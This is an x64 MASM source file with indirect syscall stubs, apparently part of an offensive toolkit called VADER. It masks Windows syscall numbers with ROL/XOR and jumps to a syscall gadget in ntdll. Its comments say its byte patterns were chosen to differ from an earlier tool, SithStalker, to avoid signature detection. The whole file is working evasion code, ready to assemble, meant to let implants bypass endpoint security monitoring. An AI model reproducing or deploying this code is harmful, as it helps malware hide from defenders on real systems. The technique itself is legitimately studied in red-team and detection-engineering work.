;
; gate_stub_vdr.asm -- VADER Indirect Syscall Stubs (x64 MASM)
; -----------------------------------------------------------------------
; VADER / 22DIV / george wu
;
; Variant B stubs with ROL/XOR masked SSN storage and different
; byte patterns from SithStalker v1/v2.
;
; SetSyscallVdr:    ROL 13 + XOR 0x3C3C before storing SSN
; IndirectSyscallVdr: XOR + ROR to recover SSN, jmp rax for gadget
;
; Byte pattern differences from SithStalker:
;   r10 = rcx via: xor r10,r10 / or r10,rcx  (4D 33 D2 4C 0B D1)
;     vs SithStalker's push rcx / pop r10     (51 41 5A)
;   Gadget jump: mov r11,[addr] / jmp r11      (41 FF E3)
;     vs SithStalker's jmp [mem]              (FF 25)
;
; ASSEMBLE:
;   ml64.exe /c gate_stub_vdr.asm /Fo:gate_stub_vdr.obj
;
; -----------------------------------------------------------------------

.data
    g_ssn_vdr       DWORD 0         ; Masked SSN (ROL 13 + XOR 0x3C3C)
    g_gadget_vdr    QWORD 0         ; syscall;ret gadget address
    g_ssn_xor_vdr   DWORD 03C3Ch    ; XOR mask constant

.code

; -----------------------------------------------------------------------
; SetSyscallVdr -- store SSN with ROL mask
; -----------------------------------------------------------------------
; RCX = raw SSN (DWORD)
; RDX = gadget address (void *)
;
; Masks SSN before storage: ROL 13 then XOR 0x3C3C
; -----------------------------------------------------------------------

SetSyscallVdr PROC
    rol ecx, 13                     ; ROL mask step 1
    xor ecx, 03C3Ch                 ; XOR mask step 2
    mov g_ssn_vdr, ecx              ; store masked SSN
    mov g_gadget_vdr, rdx           ; store gadget address
    ret
SetSyscallVdr ENDP

; -----------------------------------------------------------------------
; IndirectSyscallVdr -- execute syscall via ntdll gadget
; -----------------------------------------------------------------------
; Arguments: same as target Nt* function
;   RCX = arg1, RDX = arg2, R8 = arg3, R9 = arg4
;   Stack args at [RSP+28h], [RSP+30h], etc.
;
; Sequence:
;   1. r10 = rcx via xor r10,r10 / or r10,rcx  (4D 33 D2 4C 0B D1)
;   2. Unmask SSN: XOR 0x3C3C then ROR 13
;   3. Jump to gadget via mov r11 / jmp r11       (41 FF E3)
; -----------------------------------------------------------------------

IndirectSyscallVdr PROC
    xor r10, r10                    ; 4D 33 D2 -- zero r10
    or  r10, rcx                    ; 4C 0B D1 -- r10 = rcx (different bytes)
    mov r11, g_gadget_vdr           ; load gadget address FIRST (r11 is volatile)
    mov eax, g_ssn_vdr              ; load masked SSN into eax
    xor eax, g_ssn_xor_vdr         ; undo XOR mask
    ror eax, 13                     ; undo ROL mask -- eax = real SSN
    jmp r11                         ; 41 FF E3 -- jump to syscall;ret in ntdll
    ; ntdll's ret returns to our caller
IndirectSyscallVdr ENDP

END
